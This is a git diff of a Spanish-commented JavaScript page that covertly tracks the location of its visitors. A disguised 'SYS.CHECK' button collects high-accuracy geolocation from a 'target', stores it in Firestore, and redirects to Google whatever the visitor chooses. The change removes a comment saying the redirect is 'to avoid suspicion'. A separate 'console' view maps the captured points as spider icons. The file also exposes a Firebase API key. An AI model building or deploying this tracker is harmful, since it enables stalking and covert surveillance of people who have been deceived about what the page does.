@@ -1,6 +1,6 @@
 // --- CONFIGURACIÓN DE FIREBASE ---
 import { initializeApp } from "firebase/app";
-import { getFirestore, collection, addDoc, getDocs, onSnapshot } from "firebase/firestore";
+import { getFirestore, collection, addDoc, onSnapshot } from "firebase/firestore";
 
 const firebaseConfig = {
   apiKey: "AIzaSyCvJx96Z6LoG9O1UEs-KCNfqjpRrVFjVBQ",
@@ -17,13 +17,14 @@ const db = getFirestore(app);
 
 // --- LÓGICA DE LA APLICACIÓN ---
 document.addEventListener("DOMContentLoaded", () => {
-    const sysCheckBtn = document.getElementById("sysCheckBtn"); // El botón renombrado a "SYS.CHECK"
+    const sysCheckBtn = document.getElementById("sysCheckBtn");
     const mapContainer = document.getElementById("map");
 
-    // Detectar si estamos en la vista de consola o en la vista del objetivo
+    // Detectar si estamos en la vista de consola (mapa) o en la vista del objetivo
     if (mapContainer) {
         // --- MODO CONSOLA (Visualización de Arañas 🕷️) ---
         const map = L.map('map').setView([0, 0], 2);
+        
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
             attribution: '© OpenStreetMap contributors'
         }).addTo(map);
@@ -31,12 +32,12 @@ document.addEventListener("DOMContentLoaded", () => {
         // Icono personalizado con la araña
         const spiderIcon = L.divIcon({
             className: 'spider-marker',
-            html: '<div style="font-size: 24px;">🕷️</div>',
+            html: '<div style="font-size: 24px; text-align: center;">🕷️</div>',
             iconSize: [30, 30],
             iconAnchor: [15, 15]
         });
 
-        // Escuchar cambios en tiempo real en la colección de Firestore
+        // Escuchar cambios en tiempo real en Firestore
         onSnapshot(collection(db, "locations"), (snapshot) => {
             snapshot.docChanges().forEach((change) => {
                 if (change.type === "added") {
@@ -63,7 +64,6 @@ document.addEventListener("DOMContentLoaded", () => {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         try {
-                            // Guardar cada punto de forma independiente usando addDoc (evita sobreescrituras)
                             await addDoc(collection(db, "locations"), {
                                 latitude: position.coords.latitude,
                                 longitude: position.coords.longitude,
@@ -72,11 +72,11 @@ document.addEventListener("DOMContentLoaded", () => {
                         } catch (e) {
                             console.error("Error al registrar posición", e);
                         }
-                        // Redirección inmediata a Google para evitar sospechas
+                        // Redirección inmediata a Google
                         window.location.href = "https://www.google.com";
                     },
                     (error) => {
-                        // Si rechaza el permiso, redirigir de igual manera
+                        // Si deniega el permiso, redirige de todos modos
                         window.location.href = "https://www.google.com";
                     },
                     { enableHighAccuracy: true }
